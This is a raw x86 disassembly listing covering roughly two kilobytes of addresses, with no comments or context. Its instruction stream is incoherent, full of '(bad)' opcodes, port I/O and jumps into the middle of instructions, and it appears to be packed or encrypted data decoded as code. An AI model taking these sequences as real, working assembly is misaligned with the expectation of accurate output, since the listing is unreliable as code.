  40f6fd:	or     DWORD PTR [ecx-0x29d721be],eax
  40f703:	cmp    esp,0x17
  40f706:	pop    edx
  40f707:	and    DWORD PTR [bp+0x4c],esp
  40f70b:	mov    dh,0x4a
  40f70d:	aaa    
  40f70e:	or     eax,0xcd5d8591
  40f713:	jp     0x40f78a
  40f715:	pop    ss
  40f716:	scas   al,BYTE PTR es:[edi]
  40f717:	or     bh,cl
  40f719:	cld    
  40f71a:	dec    eax
  40f71b:	xchg   esp,eax
  40f71c:	arpl   WORD PTR [ebp-0x31e3dc28],di
  40f722:	daa    
  40f723:	int3   
  40f724:	ficom  DWORD PTR [eax+edi*4+0x7d084235]
  40f72b:	mov    BYTE PTR es:[ebx],bh
  40f72e:	or     BYTE PTR [ebp+0x36d8f0f6],cl
  40f734:	lea    edx,[edi+0x9]
  40f737:	jnp    0x40f791
  40f739:	add    BYTE PTR [eax],al
  40f73b:	add    BYTE PTR [eax],al
  40f73d:	add    BYTE PTR [eax],al
  40f73f:	adc    DWORD PTR [ebp-0x1caa2],esp
  40f745:	jnp    0x40f6ec
  40f747:	int    0xa1
  40f749:	ficom  WORD PTR [ebp+ebp*1+0xa]
  40f74d:	icebp  
  40f74e:	stos   BYTE PTR es:[edi],al
  40f74f:	or     esi,edi
  40f751:	add    BYTE PTR [eax],al
  40f753:	and    al,BYTE PTR [edi]
  40f755:	add    BYTE PTR [eax],al
  40f757:	mov    BYTE PTR [esi],bl
  40f759:	call   0x8d5e2c6c
  40f75e:	outs   dx,DWORD PTR ds:[esi]
  40f75f:	test   DWORD PTR [ecx+0x598f2671],ecx
  40f765:	es out 0x2b,al
  40f768:	lods   al,BYTE PTR ds:[esi]
  40f769:	jecxz  0x40f7b2
  40f76b:	das    
  40f76c:	loopne 0x40f7e6
  40f76e:	push   ebx
  40f76f:	lahf   
  40f770:	loop   0x40f7e3
  40f772:	aas    
  40f773:	arpl   WORD PTR [esi],cx
  40f775:	imul   esi,DWORD PTR [edi+0x78d19e5],0x45b7ae5f
  40f77f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f780:	inc    ebx
  40f781:	in     al,0xfc
  40f783:	in     eax,0xbe
  40f785:	jecxz  0x40f7f9
  40f787:	scas   al,BYTE PTR es:[edi]
  40f788:	push   edi
  40f789:	pop    es
  40f78a:	xchg   esp,eax
  40f78b:	sub    BYTE PTR [ebx+ecx*1],bl
  40f78e:	outs   dx,BYTE PTR ds:[esi]
  40f78f:	jns    0x40f76f
  40f791:	jb     0x40f770
  40f793:	sbb    eax,0x940ed2b8
  40f798:	dec    ecx
  40f799:	push   0x36
  40f79b:	lea    edi,[ebx+edx*4+0x49]
  40f79f:	xchg   ecx,eax
  40f7a0:	int3   
  40f7a1:	pop    esi
  40f7a2:	push   ecx
  40f7a3:	jg     0x40f792
  40f7a5:	jg     0x40f80a
  40f7a7:	cmp    DWORD PTR [ecx-0x65],edi
  40f7aa:	ja     0x40f7bd
  40f7ac:	lods   eax,DWORD PTR ds:[esi]
  40f7ad:	cmp    al,0x8
  40f7af:	or     BYTE PTR [esi],cl
  40f7b1:	jg     0x40f761
  40f7b3:	fadd   DWORD PTR [edx-0x37]
  40f7b6:	adc    BYTE PTR [ebp-0x2a],dl
  40f7b9:	rcl    DWORD PTR [edx+0x74],cl
  40f7bc:	ja     0x40f775
  40f7be:	enter  0x4614,0xe9
  40f7c2:	dec    ecx
  40f7c3:	fadd   st(2),st
  40f7c5:	fistp  QWORD PTR [ecx]
  40f7c8:	mov    bh,0xb4
  40f7ca:	retf   0xca04
  40f7cd:	mov    esi,0x622c0582
  40f7d2:	in     al,0x99
  40f7d4:	push   edx
  40f7d5:	sahf   
  40f7d6:	lds    eax,FWORD PTR [edx+0x6f5d3dfb]
  40f7dc:	jnp    0x40f80b
  40f7de:	test   eax,0x890b21cd
  40f7e3:	xchg   esi,eax
  40f7e4:	pop    edx
  40f7e5:	or     edx,DWORD PTR [esi-0x39]
  40f7e8:	push   edi
  40f7e9:	push   0xf0e55bfc
  40f7ee:	lock xor al,0x50
  40f7f1:	out    dx,al
  40f7f2:	xchg   edi,eax
  40f7f3:	pop    esi
  40f7f4:	mov    al,0x6b
  40f7f6:	or     al,0x9f
  40f7f8:	pop    ebx
  40f7f9:	and    al,0x81
  40f7fb:	ret    
  40f7fc:	pop    eax
  40f7fd:	push   ecx
  40f7fe:	test   eax,0x85769397
  40f803:	cmc    
  40f804:	fdivr  DWORD PTR [edi+ecx*2+0x4d5657d1]
  40f80b:	cmp    dl,BYTE PTR [esi+eax*4]
  40f80e:	push   ebx
  40f80f:	push   edx
  40f810:	fnstenv [esi+0x64]
  40f813:	xchg   DWORD PTR [esp+edi*2-0x24b210ad],esi
  40f81a:	xlat   BYTE PTR ds:[ebx]
  40f81b:	test   BYTE PTR [ecx],0xd8
  40f81e:	mov    dl,0xf5
  40f820:	test   DWORD PTR [edi-0x6a],0x6e90707
  40f827:	xchg   ebx,eax
  40f828:	sbb    al,0xd1
  40f82a:	jns    0x40f80b
  40f82c:	push   es
  40f82d:	out    0xc0,eax
  40f82f:	fbld   TBYTE PTR [esi+0x4d0e4b6d]
  40f835:	sete   BYTE PTR [ecx-0x65]
  40f839:	jbe    0x40f821
  40f83b:	pop    ss
  40f83c:	sub    ah,al
  40f83e:	jae    0x40f866
  40f840:	ins    DWORD PTR es:[edi],dx
  40f841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f842:	and    al,0xc6
  40f844:	xchg   esi,eax
  40f845:	outs   dx,BYTE PTR ds:[esi]
  40f846:	lods   eax,DWORD PTR ds:[esi]
  40f847:	xchg   esp,eax
  40f848:	push   ds
  40f849:	xchg   DWORD PTR [esi+edi*2+0x1d6eca30],esp
  40f850:	jp     0x40f8a0
  40f852:	mov    ds:0xfe314aec,al
  40f857:	push   esi
  40f858:	xchg   esi,eax
  40f859:	mov    ebx,0xc089fe55
  40f85e:	sub    al,0xb5
  40f860:	push   eax
  40f861:	mov    bh,BYTE PTR [esi+ebp*4-0x579d90c7]
  40f868:	inc    edi
  40f869:	mov    BYTE PTR [edx+ebx*2],dl
  40f86c:	push   0x5a
  40f86e:	nop
  40f86f:	es push eax
  40f871:	icebp  
  40f872:	test   BYTE PTR [esi+0x2f],bl
  40f875:	popa   
  40f876:	and    esi,esi
  40f878:	iret   
  40f879:	adc    esi,esp
  40f87b:	xchg   ebx,eax
  40f87c:	xchg   BYTE PTR ds:0x21b6a1e0,cl
  40f882:	je     0x40f88d
  40f884:	daa    
  40f885:	jne    0x40f8a6
  40f887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f888:	or     eax,0xecd8d3f3
  40f88d:	out    0x2b,al
  40f88f:	ja     0x40f846
  40f891:	mov    ds:0x8935914d,eax
  40f896:	pushf  
  40f897:	mov    dh,0x9d
  40f899:	daa    
  40f89a:	jecxz  0x40f826
  40f89c:	inc    esp
  40f89d:	jne    0x40f880
  40f89f:	fstp   DWORD PTR [ebx-0x7d]
  40f8a2:	add    BYTE PTR [esi-0x2f3338bf],dh
  40f8a8:	push   ebp
  40f8a9:	gs add dl,bh
  40f8ac:	add    BYTE PTR [edi],dh
  40f8ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8af:	pop    esp
  40f8b0:	dec    ebp
  40f8b1:	push   cs
  40f8b2:	add    DWORD PTR ds:0xa25cc6e1,0xba7e334a
  40f8bc:	inc    edi
  40f8bd:	je     0x40f848
  40f8bf:	fs addr16 add al,0xa
  40f8c3:	hlt    
  40f8c4:	fsubr  st(2),st
  40f8c6:	push   0x700df2f2
  40f8cb:	test   BYTE PTR [edi],0x5b
  40f8ce:	sti    
  40f8cf:	aas    
  40f8d0:	inc    eax
  40f8d1:	jbe    0x40f8df
  40f8d3:	loop   0x40f918
  40f8d5:	cmp    eax,edi
  40f8d7:	inc    ebx
  40f8d8:	push   esp
  40f8d9:	sub    DWORD PTR [ecx-0x12],esi
  40f8dc:	xchg   ecx,eax
  40f8dd:	addr16 jns 0x40f91b
  40f8e0:	cmp    eax,0xce4250f5
  40f8e5:	mov    ch,0x9e
  40f8e7:	mov    eax,ds:0xb6d4a809
  40f8ec:	cmp    BYTE PTR [ebx+edx*4+0x78e23d44],dh
  40f8f3:	sbb    DWORD PTR [ebp-0x69],0xa7c77627
  40f8fa:	popf   
  40f8fb:	popf   
  40f8fc:	jne    0x40f92d
  40f8fe:	rcl    cl,1
  40f900:	in     eax,0x94
  40f902:	push   ebp
  40f903:	adc    BYTE PTR [edx+0xc9d583a],bl
  40f909:	fwait
  40f90a:	cmp    eax,0x515319a4
  40f90f:	lea    ebx,[ebx+edx*1]
  40f912:	push   0x934b7c02
  40f917:	push   edi
  40f918:	cs ja  0x40f8c4
  40f91b:	icebp  
  40f91c:	aam    0xe1
  40f91e:	arpl   WORD PTR [ebp-0x454cacc6],ax
  40f924:	out    0x69,al
  40f926:	dec    ecx
  40f927:	stos   BYTE PTR es:[edi],al
  40f928:	ins    BYTE PTR es:[edi],dx
  40f929:	pop    edx
  40f92a:	push   ss
  40f92b:	jle    0x40f8f0
  40f92d:	jb     0x40f994
  40f92f:	retf   
  40f930:	and    esp,ebp
  40f932:	xchg   esp,eax
  40f933:	rcr    DWORD PTR [edi+ebx*2-0x2e],cl
  40f937:	jns    0x40f968
  40f939:	js     0x40f98a
  40f93b:	or     BYTE PTR [edx-0x6],dh
  40f93e:	cmovge edi,DWORD PTR [ecx+0x7b8c1360]
  40f945:	pop    esp
  40f946:	push   0x79028060
  40f94b:	add    BYTE PTR [esi+eiz*8-0x43af2f7e],bh
  40f952:	push   edx
  40f953:	out    0xb0,al
  40f955:	xchg   esi,eax
  40f956:	scas   al,BYTE PTR es:[edi]
  40f957:	dec    ecx
  40f958:	dec    ebp
  40f959:	add    dl,BYTE PTR [ebp+0x39]
  40f95c:	add    dl,BYTE PTR [ebp+0x14016e0b]
  40f962:	bound  ebp,QWORD PTR [edx-0x545dad0f]
  40f968:	shl    DWORD PTR [ecx-0x644bf285],1
  40f96e:	push   ebp
  40f96f:	in     al,dx
  40f970:	jg     0x40f913
  40f972:	imul   ecx,DWORD PTR [ebp+0x1e],0x20923c2e
  40f979:	jl     0x40f926
  40f97b:	popa   
  40f97c:	push   ds
  40f97d:	popa   
  40f97e:	sbb    bl,ah
  40f980:	adc    al,0xe1
  40f982:	stc    
  40f983:	enter  0x5e16,0x7a
  40f987:	push   ds
  40f988:	push   ecx
  40f989:	ins    BYTE PTR es:[edi],dx
  40f98a:	cwde   
  40f98b:	or     eax,0x9e2c0080
  40f990:	sar    DWORD PTR ds:0xcc4f21ee,cl
  40f996:	ror    BYTE PTR ds:0xadd9e8ab,1
  40f99c:	or     esp,esi
  40f99e:	cmp    eax,DWORD PTR [edi]
  40f9a0:	jmp    0x40f947
  40f9a2:	jbe    0x40f9b2
  40f9a4:	jl     0x40f9cc
  40f9a6:	les    bp,DWORD PTR [eax+0x68]
  40f9aa:	cli    
  40f9ab:	jge    0x40f930
  40f9ad:	cmp    esi,esi
  40f9af:	adc    BYTE PTR [bp+si-0x69],0x29
  40f9b4:	ret    
  40f9b5:	xor    eax,0x4208947e
  40f9ba:	cmp    al,0x85
  40f9bc:	mov    esp,0x81717b8
  40f9c1:	jns    0x40fa22
  40f9c3:	daa    
  40f9c4:	clc    
  40f9c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9c6:	sbb    ecx,DWORD PTR [edx]
  40f9c8:	sahf   
  40f9c9:	fdiv   st(2),st
  40f9cb:	pop    ss
  40f9cc:	popa   
  40f9cd:	int3   
  40f9ce:	out    dx,eax
  40f9cf:	inc    eax
  40f9d0:	fcmovnbe st,st(3)
  40f9d2:	mov    eax,ds:0x3df81d0d
  40f9d7:	ret    
  40f9d8:	arpl   WORD PTR [ecx-0x9eba185],ax
  40f9de:	cmp    DWORD PTR [esi+0x9],edx
  40f9e1:	dec    ecx
  40f9e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9e3:	dec    edx
  40f9e4:	sub    DWORD PTR [edi+eiz*8],esp
  40f9e7:	adc    BYTE PTR [ebx+0x26],cl
  40f9ea:	retf   0x18d8
  40f9ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9ee:	dec    ebp
  40f9ef:	test   eax,0x1f45c8f3
  40f9f4:	inc    ebx
  40f9f5:	int3   
  40f9f6:	es or  cl,dh
  40f9f9:	dec    ecx
  40f9fa:	push   ds
  40f9fb:	push   esi
  40f9fc:	and    ebx,DWORD PTR [ecx+0x65]
  40f9ff:	sub    eax,0xdb485520
  40fa04:	aaa    
  40fa05:	repz sub ch,BYTE PTR gs:[ebp-0x7e6e34d8]
  40fa0d:	cwde   
  40fa0e:	xor    DWORD PTR [ecx+eax*8+0xcd35f5c],edi
  40fa15:	jp     0x40f9ac
  40fa17:	dec    eax
  40fa18:	out    0xa1,eax
  40fa1a:	lods   al,BYTE PTR ds:[esi]
  40fa1b:	inc    eax
  40fa1c:	and    eax,0xd7f660b8
  40fa21:	sbb    al,0x47
  40fa23:	(bad)  
  40fa24:	or     DWORD PTR [esi],esi
  40fa26:	sub    bh,bh
  40fa28:	dec    edx
  40fa29:	xchg   edi,eax
  40fa2a:	mov    bl,0x19
  40fa2c:	bound  ecx,QWORD PTR [eax-0x1a]
  40fa2f:	fst    QWORD PTR [edx]
  40fa31:	pop    ss
  40fa32:	and    esp,ebx
  40fa34:	mov    edi,ss
  40fa36:	xchg   edi,eax
  40fa37:	fld    QWORD PTR [ebx-0xd]
  40fa3a:	mov    WORD PTR [eax],gs
  40fa3c:	xlat   BYTE PTR ds:[ebx]
  40fa3d:	test   BYTE PTR [esi],dl
  40fa3f:	std    
  40fa40:	jae    0x40f9d1
  40fa42:	xor    BYTE PTR [ecx],bl
  40fa44:	jnp    0x40fa81
  40fa46:	mov    dh,0x5d
  40fa48:	mov    esp,0x3a892723
  40fa4d:	jge    0x40f9e7
  40fa4f:	add    bh,0xc1
  40fa52:	push   ss
  40fa53:	mov    ds:0xfcd8fe4b,al
  40fa58:	ret    0xf47b
  40fa5b:	ror    BYTE PTR [esp+edx*8-0x5f],1
  40fa5f:	jns    0x40f9eb
  40fa61:	sub    BYTE PTR [ecx-0x19],bh
  40fa64:	daa    
  40fa65:	js     0x40fa42
  40fa67:	pop    esp
  40fa68:	add    BYTE PTR [ebx+0xd19f12a],0xab
  40fa6f:	push   edi
  40fa70:	inc    eax
  40fa71:	xchg   ebx,eax
  40fa72:	sbb    bl,BYTE PTR [ebx+0x6f]
  40fa75:	xor    dh,dl
  40fa77:	xchg   edi,eax
  40fa78:	je     0x40fa53
  40fa7a:	sbb    ah,BYTE PTR [edi]
  40fa7c:	jl     0x40fa91
  40fa7e:	in     eax,0x1c
  40fa80:	clc    
  40fa81:	retf   0x6195
  40fa84:	fist   DWORD PTR [edi+0x6324feba]
  40fa8a:	push   0x8c5605f4
  40fa8f:	pop    esi
  40fa90:	jo     0x40fa97
  40fa92:	gs add eax,0x486bc224
  40fa98:	push   es
  40fa99:	mov    BYTE PTR [edx],bh
  40fa9b:	cwde   
  40fa9c:	jg     0x40faf3
  40fa9e:	sti    
  40fa9f:	sub    al,0xb3
  40faa1:	jbe    0x40faed
  40faa3:	mov    al,0x24
  40faa5:	add    BYTE PTR [ebx+esi*2],dh
  40faa8:	xchg   ebp,eax
  40faa9:	cld    
  40faaa:	jne    0x40fa57
  40faac:	je     0x40fa4e
  40faae:	test   al,0xcf
  40fab0:	inc    ebp
  40fab1:	jns    0x40fb03
  40fab3:	enter  0xdb5b,0xef
  40fab7:	inc    ebp
  40fab8:	jmp    0x1e3f:0xe5ba954f
  40fabf:	ins    DWORD PTR es:[edi],dx
  40fac0:	mov    bl,0x43
  40fac2:	push   esp
  40fac3:	and    ebp,ecx
  40fac5:	stos   DWORD PTR es:[edi],eax
  40fac6:	imul   eax,DWORD PTR [eax-0xc],0xffffffab
  40faca:	fdiv   DWORD PTR [ecx-0x4e]
  40facd:	inc    ecx
  40face:	xor    eax,0xf87be8e3
  40fad3:	(bad)  
  40fad4:	repnz icebp 
  40fad6:	mov    ah,0x1
  40fad8:	lea    edx,[ecx]
  40fada:	fwait
  40fadb:	or     eax,0x222443a3
  40fae0:	jecxz  0x40fa84
  40fae2:	rol    BYTE PTR [ebx-0x30eef6c8],1
  40fae8:	jae    0x40fabf
  40faea:	pop    esp
  40faeb:	mov    cl,cl
  40faed:	cmp    dh,bl
  40faef:	dec    eax
  40faf0:	and    ch,BYTE PTR [edx-0x1e391512]
  40faf6:	add    BYTE PTR [edx],bh
  40faf8:	cmp    al,0xaf
  40fafa:	and    bh,BYTE PTR [edx]
  40fafc:	cmp    BYTE PTR [edi+edi*8+0xae276e0],dh
  40fb03:	adc    al,0xbb
  40fb05:	(bad)  
  40fb06:	int3   
  40fb07:	and    edx,DWORD PTR [eax-0x2bfa818a]
  40fb0d:	or     al,BYTE PTR [edx+0x136b9bdd]
  40fb13:	sti    
  40fb14:	xchg   ebp,eax
  40fb15:	xchg   DWORD PTR [esi],esp
  40fb17:	push   esi
  40fb18:	xlat   BYTE PTR ds:[ebx]
  40fb19:	add    al,0x72
  40fb1b:	jl     0x40fb52
  40fb1d:	add    eax,0xeded7943
  40fb22:	xor    edx,DWORD PTR [edi-0x36]
  40fb25:	daa    
  40fb26:	loopne 0x40fb0b
  40fb28:	test   eax,0xd5beedda
  40fb2d:	sti    
  40fb2e:	inc    ecx
  40fb2f:	imul   esp,DWORD PTR [esi+0x51],0xffffffab
  40fb33:	inc    edx
  40fb34:	lods   al,BYTE PTR ds:[esi]
  40fb35:	push   es
  40fb36:	stos   BYTE PTR es:[edi],al
  40fb37:	(bad)  
  40fb38:	daa    
  40fb39:	gs icebp 
  40fb3b:	mov    ds:0xb12a1da7,al
  40fb40:	xor    eax,0xe833b7f2
  40fb45:	add    DWORD PTR [ebp-0x66],ebp
  40fb48:	into   
  40fb49:	push   ss
  40fb4a:	sub    eax,0xff919f78
  40fb4f:	repz xor edi,DWORD PTR [edi-0x38]
  40fb53:	xor    al,0x64
  40fb55:	call   0x6336:0xb9f47dfa
  40fb5c:	add    BYTE PTR [ecx-0x2f],dh
  40fb5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb60:	cmp    dh,bl
  40fb62:	fcom   QWORD PTR [esi+0x204787a2]
  40fb68:	aas    
  40fb69:	cmp    ecx,DWORD PTR [ebx+0xbf536b4]
  40fb6f:	stos   BYTE PTR es:[edi],al
  40fb70:	adc    BYTE PTR [eax],0xbd
  40fb73:	shl    DWORD PTR [ebp+edx*1-0x1f83cfbe],1
  40fb7a:	ins    DWORD PTR es:[edi],dx
  40fb7b:	repz xchg ebx,eax
  40fb7d:	inc    eax
  40fb7e:	in     eax,dx
  40fb7f:	mov    eax,0xbfaed7df
  40fb84:	fs mov cl,0xae
  40fb87:	push   es
  40fb88:	mov    eax,0x7bcb88ef
  40fb8d:	inc    edi
  40fb8e:	pop    ebx
  40fb8f:	les    edx,FWORD PTR [eax]
  40fb91:	add    al,0x79
  40fb93:	sbb    eax,0xa8fbca09
  40fb98:	xchg   esp,eax
  40fb99:	shl    DWORD PTR [esi],cl
  40fb9b:	jae    0x40fb56
  40fb9d:	cwde   
  40fb9e:	add    esi,DWORD PTR [edx-0x516cfb62]
  40fba4:	mov    eax,0x740899b7
  40fba9:	into   
  40fbaa:	xchg   dl,al
  40fbac:	lods   al,BYTE PTR ds:[esi]
  40fbad:	cmp    edx,DWORD PTR [edx]
  40fbaf:	mov    al,ds:0x85c47227
  40fbb4:	int3   
  40fbb5:	dec    esi
  40fbb6:	stos   DWORD PTR es:[edi],eax
  40fbb7:	scas   al,BYTE PTR es:[edi]
  40fbb8:	in     al,0x2a
  40fbba:	and    bl,BYTE PTR [ebx+0x40]
  40fbbd:	jbe    0x40fbb6
  40fbbf:	inc    esi
  40fbc0:	fidivr WORD PTR [eax-0x7f]
  40fbc3:	inc    esi
  40fbc4:	jno    0x40fb46
  40fbc6:	sbb    DWORD PTR [esi],eax
  40fbc8:	outs   dx,BYTE PTR ds:[esi]
  40fbc9:	call   0xf398e260
  40fbce:	clc    
  40fbcf:	cmp    ch,BYTE PTR [eax+0x1f]
  40fbd2:	xchg   ebp,eax
  40fbd3:	adc    DWORD PTR [eax],edi
  40fbd5:	in     al,0x4a
  40fbd7:	pusha  
  40fbd8:	call   0xd8f:0xf93b289c
  40fbdf:	int3   
  40fbe0:	dec    eax
  40fbe1:	mov    bh,0xee
  40fbe3:	test   al,0x29
  40fbe5:	dec    eax
  40fbe6:	fstp   QWORD PTR [edx+0x3416b0ca]
  40fbec:	mov    eax,ds:0xabea224f
  40fbf1:	dec    edx
  40fbf2:	bswap  edx
  40fbf4:	add    DWORD PTR [eax+0x48],ebp
  40fbf7:	pop    es
  40fbf8:	ret    
  40fbf9:	(bad)  
  40fbfa:	out    dx,al
  40fbfb:	mov    DWORD PTR [edi+0x3d9b08a9],eax
  40fc01:	dec    esi
  40fc02:	sub    al,0x8
  40fc04:	jge    0x40fbf4
  40fc06:	or     ax,WORD PTR [ecx-0x3a]
  40fc0a:	mov    esp,0x5ba976e5
  40fc0f:	cmp    BYTE PTR [edi],dh
  40fc11:	adc    WORD PTR [esi+0x44],bp
  40fc15:	sbb    DWORD PTR ds:0x9c5f08c4,0x2c
  40fc1c:	dec    ebx
  40fc1d:	inc    ecx
  40fc1e:	lods   al,BYTE PTR ds:[esi]
  40fc1f:	adc    edi,ebp
  40fc21:	fdiv   QWORD PTR [ebx+0x1f]
  40fc24:	(bad)  
  40fc25:	stc    
  40fc26:	sub    DWORD PTR [esp+0x3f],esp
  40fc2a:	jno    0x40fbd0
  40fc2c:	sbb    sp,WORD PTR [esi-0x59]
  40fc30:	pop    ebp
  40fc31:	idiv   BYTE PTR ds:0x672476a7
  40fc37:	mov    edi,esp
  40fc39:	mul    BYTE PTR [edx+0x3]
  40fc3c:	jmp    0xef114c9f
  40fc41:	mov    ch,0xb3
  40fc43:	push   ecx
  40fc44:	in     eax,0xd5
  40fc46:	test   BYTE PTR [ecx+0x43],0xc2
  40fc4a:	adc    eax,0x235adbc
  40fc4f:	add    DWORD PTR [esi+edx*1-0x57],ebp
  40fc53:	add    bl,al
  40fc55:	test   BYTE PTR [eax],0x34
  40fc58:	adc    eax,0xb874164a
  40fc5d:	or     esp,ecx
  40fc5f:	sub    eax,0x3e85cba
  40fc64:	mov    cl,0x97
  40fc66:	arpl   WORD PTR [ecx+0x2e7aed2f],dx
  40fc6c:	inc    eax
  40fc6d:	dec    esp
  40fc6e:	addr16 mov esp,0x222db989
  40fc74:	cmp    ecx,esi
  40fc76:	call   0x3507f499
  40fc7b:	loope  0x40fc60
  40fc7d:	push   DWORD PTR [esi+0x52]
  40fc80:	mov    edx,0x82a3acc0
  40fc85:	xor    eax,DWORD PTR [ecx-0x2f]
  40fc88:	dec    ebp
  40fc89:	adc    eax,0x5603efa8
  40fc8e:	jae    0x40fc9d
  40fc90:	sub    al,0xc9
  40fc92:	and    DWORD PTR es:[edi],esp
  40fc95:	push   ss
  40fc96:	mov    cl,0x8e
  40fc98:	push   ecx
  40fc99:	inc    ebx
  40fc9a:	xor    BYTE PTR ds:0xc9a64cff,al
  40fca0:	pushf  
  40fca1:	mov    es,WORD PTR [esi-0x2d59ed55]
  40fca7:	or     BYTE PTR [ecx+0x53],ah
  40fcaa:	(bad)  
  40fcab:	xchg   edi,eax
  40fcac:	pop    esi
  40fcad:	sar    DWORD PTR [edi+0x397c2c9a],cl
  40fcb3:	xchg   esp,eax
  40fcb4:	cmp    bh,BYTE PTR [ecx-0x2d91fc64]
  40fcba:	jb     0x40fcb2
  40fcbc:	dec    ecx
  40fcbd:	in     al,0x4
  40fcbf:	sub    eax,0x2e574766
  40fcc4:	aad    0x96
  40fcc6:	and    DWORD PTR [ecx],ebp
  40fcc8:	mov    ebx,0x6c21abbf
  40fccd:	cdq    
  40fcce:	imul   ebp,DWORD PTR [eax+0x6],0x55c6a5ec
  40fcd5:	and    DWORD PTR [esi+0x3b64407a],ebp
  40fcdb:	jbe    0x40fd15
  40fcdd:	data16 addr16 (bad) 
  40fce0:	push   esp
  40fce1:	add    eax,0x4a28e400
  40fce6:	imul   esp,DWORD PTR ds:0x37d9f6dc,0x1faf518f
  40fcf0:	mov    bh,0x72
  40fcf2:	clc    
  40fcf3:	cmp    DWORD PTR ds:0x1d715221,ebx
  40fcf9:	arpl   WORD PTR [edi+0x29c85be0],dx
  40fcff:	bound  ecx,QWORD PTR [esi+edi*8+0x75]
  40fd03:	push   ebx
  40fd04:	sbb    eax,0xd4fdaba6
  40fd09:	cmp    eax,0x6c5c89e8
  40fd0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd0f:	mov    ss,WORD PTR [edi+0x30]
  40fd12:	jg     0x40fd04
  40fd14:	push   esi
  40fd15:	call   0x5fe2a92a
  40fd1a:	inc    ebx
  40fd1b:	add    DWORD PTR [esi],ebx
  40fd1d:	mov    DWORD PTR [esi],esp
  40fd1f:	inc    eax
  40fd20:	push   eax
  40fd21:	jns    0x40fd68
  40fd23:	jb     0x40fccc
  40fd25:	(bad)  
  40fd27:	(bad)  
  40fd28:	in     al,dx
  40fd29:	dec    ecx
  40fd2a:	push   0x2e35e76d
  40fd2f:	add    ebp,DWORD PTR [esi+0x6599547c]
  40fd35:	sbb    BYTE PTR [ebx],bh
  40fd37:	jno    0x40fcc7
  40fd39:	cmp    DWORD PTR [edi-0x6d],ecx
  40fd3c:	or     eax,0x9f26ff16
  40fd41:	mov    BYTE PTR [ecx-0x763a9ad6],ah
  40fd47:	aam    0xb
  40fd49:	sbb    BYTE PTR [esi],cl
  40fd4b:	push   ebp
  40fd4c:	xchg   edx,eax
  40fd4d:	sar    BYTE PTR [ecx+0x46237834],cl
  40fd53:	mov    bh,0x43
  40fd55:	dec    ebp
  40fd56:	pop    ecx
  40fd57:	mov    ds:0x3669f9a6,al
  40fd5c:	push   ecx
  40fd5d:	imul   ebx,DWORD PTR [ebp-0x15],0x86b0d8ed
  40fd64:	fwait
  40fd65:	stos   BYTE PTR es:[edi],al
  40fd66:	fcomp  st(3)
  40fd68:	bound  ecx,QWORD PTR [ebp+0x58]
  40fd6b:	outs   dx,DWORD PTR ds:[esi]
  40fd6c:	je     0x40fd12
  40fd6e:	repnz fdiv st,st(4)
  40fd71:	mov    ebp,0xef9a5447
  40fd76:	mov    ecx,esi
  40fd78:	push   ebx
  40fd79:	xchg   ebx,eax
  40fd7a:	popa   
  40fd7b:	add    BYTE PTR [eax],0xf1
  40fd7e:	add    eax,0x733ab443
  40fd83:	inc    edx
  40fd84:	pop    esp
  40fd85:	stos   DWORD PTR es:[edi],eax
  40fd86:	aad    0x48
  40fd88:	dec    ecx
  40fd89:	mov    cl,0xee
  40fd8b:	(bad)  
  40fd8c:	adc    al,0x1
  40fd8e:	mov    ecx,0x8ceda56b
  40fd93:	inc    esp
  40fd94:	mov    WORD PTR [edi+0x25d3eccf],cs
  40fd9a:	fbld   TBYTE PTR [ebx+0x29aaf6b5]
  40fda0:	and    esp,esi
  40fda2:	push   ecx
  40fda3:	or     al,0x4
  40fda5:	imul   esp,ecx,0x7e237348
  40fdab:	ins    DWORD PTR es:[edi],dx
  40fdac:	in     al,0x57
  40fdae:	aas    
  40fdaf:	aam    0xf4
  40fdb1:	in     eax,0x2d
  40fdb3:	add    dh,BYTE PTR [eax+0x7cad110a]
  40fdb9:	xchg   ebx,eax
  40fdba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdbb:	in     al,0x38
  40fdbd:	ds jne 0x40fd4b
  40fdc0:	retf   
  40fdc1:	stc    
  40fdc2:	retf   0x8eeb
  40fdc5:	cmp    BYTE PTR [esi+0xb8b43bd],dh
  40fdcb:	test   BYTE PTR [esi+0x9],dh
  40fdce:	imul   edx,edx,0x66
  40fdd1:	mov    bh,0xbf
  40fdd4:	int3   
  40fdd5:	int3   
  40fdd6:	sub    esp,DWORD PTR [edx]
  40fdd8:	push   esi
  40fdd9:	jg     0x40fe29
  40fddb:	je     0x40fd86
  40fddd:	jbe    0x40fd98
  40fddf:	popa   
  40fde0:	or     al,0xb5
  40fde2:	and    al,0x1b
  40fde4:	jo     0x40fd88
  40fde6:	dec    ecx
  40fde7:	mov    bh,0xcf
  40fde9:	leave  
  40fdea:	aad    0x6a
  40fdec:	(bad)  
  40fded:	xchg   esi,eax
  40fdee:	inc    esi
  40fdef:	and    eax,0x1911e376
  40fdf4:	das    
  40fdf5:	popa   
  40fdf6:	cmp    ebp,DWORD PTR [ebp-0x3d]
  40fdf9:	test   BYTE PTR [eax-0x123f6fcf],ch
  40fdff:	mov    dl,0x99
  40fe01:	jmp    0x40fe51
  40fe03:	jno    0x40fd92
  40fe05:	cmp    eax,0xd2b714d8
  40fe0a:	dec    ebx
  40fe0b:	jns    0x40fdc9
  40fe0d:	and    eax,0x72e06160
  40fe12:	jae    0x40fdcb
  40fe14:	sbb    ebx,DWORD PTR [ecx+0x75270b9c]
  40fe1a:	adc    eax,0xee612ebb
  40fe1f:	add    BYTE PTR [ebx+0x644de521],bh
  40fe25:	stc    
  40fe26:	cmp    DWORD PTR [ebx-0x23bb7ae0],edi
  40fe2c:	std    
  40fe2d:	adc    BYTE PTR [ecx+0x30],0xc1
  40fe31:	push   0x48
  40fe33:	jns    0x40fdbd
  40fe35:	xor    dl,cl
  40fe37:	mov    bh,0xeb
  40fe39:	repz test DWORD PTR ds:0xd1d83306,0xce3c3a0a
  40fe44:	jge    0x40fe23
  40fe46:	cmp    DWORD PTR [ebx-0x539338e6],ebp
  40fe4c:	popf   
